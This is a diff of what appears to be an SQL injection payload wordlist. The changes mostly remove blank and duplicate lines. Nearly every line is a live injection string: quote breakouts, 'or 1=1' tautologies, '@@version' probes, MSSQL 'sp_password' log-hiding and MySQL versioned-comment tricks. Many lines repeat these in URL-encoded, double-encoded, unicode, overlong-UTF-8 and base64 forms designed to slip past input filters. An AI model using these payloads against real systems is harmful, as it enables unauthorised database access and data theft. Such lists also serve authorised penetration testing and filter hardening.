@@ -1,47 +1,13 @@
 %EF%BC%87
-
 %00%27
-
-'
 %00
 Jwo=
-'
-
-'
-
 %2527%250A
 %27%0A
 %u0027%u000A
-'
-
-'
-
-'
-
-'
-
-'
-
-'
-
-'
-
-'
-
-'
-
-'
-
 %C0%AF%C0%8A
 %'%
-
-'
-
-'
-
-'
- and '0having'='0having'
-'
+and '0having'='0having'
 -- sp_password
 '/**/
 '--utktuClRFx%0A
@@ -54,61 +20,19 @@ Jwo=
 '+
 '%0C
 '
-
 %bf%27
-
-'
-
-'
-
-'
-
-'
-
 %EF%BC%87--
-
 %00%27--
-
 '--
 %00
 Jy0tCg==
 '--
-
-'--
-
 %2527%252D%252D%250A
 %27%2D%2D%0A
 %u0027%u002D%u002D%u000A
-'--
-
-'--
-
-'--
-
-'--
-
-'--
-
-'--
-
-'--
-
-'--
-
-'--
-
-'--
-
 %C0%AF%C0%AF%C0%AF%C0%8A
 %'%-%-%
-
-'--
-
-'--
-
-'--
  and '0having'='0having'
-'--
 -- sp_password
 '--/**/
 '----rjABozOsds%0A
@@ -120,106 +44,62 @@ Jy0tCg==
 '----%0A
 '--+
 '--%0C
-'--
-
 %bf%27--
-
-'--
-
-'--
-
-'--
-
-'--
-
 %EF%BC%87 or 1=1--
-
 %00%27 or 1=1--
-
 ' or 1=1--
 %00
 JyBvciAxPTEtLQo=
 ' or 1 BETWEEN 1 AND 1--
-
 ' or 1 LIKE 1--
-
 %2527%2520%256F%2572%2520%2531%253D%2531%252D%252D%250A
 %27%20%6F%72%20%31%3D%31%2D%2D%0A
 %u0027%u0020%u006F%u0072%u0020%u0031%u003D%u0031%u002D%u002D%u000A
 ' or 1=1--
-
 ' or 1 LIKE 1--
-
 ' or 1=1--
-
 '/*!0or 1=1--
-
 ' or 1=1--
-
 ' or 1=1--
-
 ' /*!30863or 1=1*/--
-
 ' /*!00000or 1=1*/--
-
 '   or   1=1--
-
 ' or 1=1--
-
 %C0%AF%C0%AAor%C0%AA1%C0%BF1%C0%AF%C0%AF%C0%8A
 %' %o%r %1%=%1%-%-%
-
 ' oR 1=1--
-
 ' o/**/r 1=1--
-
 ' or 1=1--
  and '0having'='0having'
 ' or 1=1--
 -- sp_password
 '/**/or/**/1=1--
-
 '--qXHlUah%0Aor--uFBlFmRGNy%0A1=1----AZkqnZ%0A
 '%23olLCiq%0Aor%23tCLnjvDcQE%0A1=1--%23bZUlaBqGS%0A
 '%23UtBJAX%0Aor%23cQIgaDjfo%0A%23dLkXHLTuUUN%0A1=1--%23lovxoI%0A
 '%09or%061=1--
-
 '%23%0Aor%23%0A1=1--%23%0A
 '%0Aor%0C1=1--
-
 '--%0Aor--%0A1=1----%0A
 '+or+1=1--
-
 '%0Aor%0C1=1--
-
 ' or 1=1--
-
 %bf%27 or 1=1--
-
 ' or 1=1--
-
 '/*!or*/1=1--
-
 '/*!or*/1=1--
-
 ' or 1=1--
-
 1 or 1=1--
-
 1 or 1=1--
-
 1 or 1=1--
 %00
 MSBvciAxPTEtLQo=
 1 or 1 BETWEEN 1 AND 1--
-
 1 or 1 LIKE 1--
-
 %2531%2520%256F%2572%2520%2531%253D%2531%252D%252D%250A
 %31%20%6F%72%20%31%3D%31%2D%2D%0A
 %u0031%u0020%u006F%u0072%u0020%u0031%u003D%u0031%u002D%u002D%u000A
 1 or 1=1--
-
 1 or 1 LIKE 1--
 
 1 or 1=1--
@@ -327,51 +207,32 @@ JyBvciAxIGluIChAQHZlcnNpb24pLS0K
 '%23LIWaLiGdfF%0Aor%23jDlUodivLcR%0A1%23ebkIIXYetR%0Ain%23ohdWGfRc%0A(@@version)--%23lIPLjF%0A
 '%23aZioJpBrT%0Aor%23aJVnsBjOjaWy%0A%23ViNRVArcCw%0A1%23aVLkkbYXmz%0Ain%23eENDPMTh%0A%23AACBFV%0A(@@version%23bzTcsXEEkD%0A)--%23ujCIVsELynkp%0A
 '%0Bor%0D1%07in%05(@@version)--
-
 '%23%0Aor%23%0A1%23%0Ain%23%0A(@@version)--%23%0A
 '%0Aor%0C1%09in%09(@@version)--
-
 '--%0Aor--%0A1--%0Ain--%0A(@@version)----%0A
 '+or+1+in+(@@version)--
-
 '%0Aor%0C1%09in%0D(@@version)--
-
 ' or 1 in (@@version)--
-
 %bf%27 or 1 in (@@version)--
-
 ' or 1 in (@@version)--
-
+'/*!or*/1/*!in*/(@@/*!version*/)---
 '/*!or*/1/*!in*/(@@/*!version*/)--
-
-'/*!or*/1/*!in*/(@@/*!version*/)--
-
 ' or 1 in (@@version)--
-
 1 or 1 in (@@version)--
-
 1 or 1 in (@@version)--
-
 1 or 1 in (@@version)--
 %00
 MSBvciAxIGluIChAQHZlcnNpb24pLS0K
 1 or 1 in (@@version)--
-
 1 or 1 in (@@version)--
-
 %2531%2520%256F%2572%2520%2531%2520%2569%256E%2520%2528%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%252D%252D%250A
 %31%20%6F%72%20%31%20%69%6E%20%28%40%40%76%65%72%73%69%6F%6E%29%2D%2D%0A
 %u0031%u0020%u006F%u0072%u0020%u0031%u0020%u0069%u006E%u0020%u0028%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u002D%u002D%u000A
 1 or 1 in (@@version)--
-
 1 or 1 in (@@version)--
-
 1 or 1 in (@@version)--
-
 1/*!0or 1/*!0in (@@/*!0version)--
-
 1 or 1 in (@@version)--
-
 1 or 1 in (@@version)--
 
 1 /*!30115or 1 in (@@version)*/--
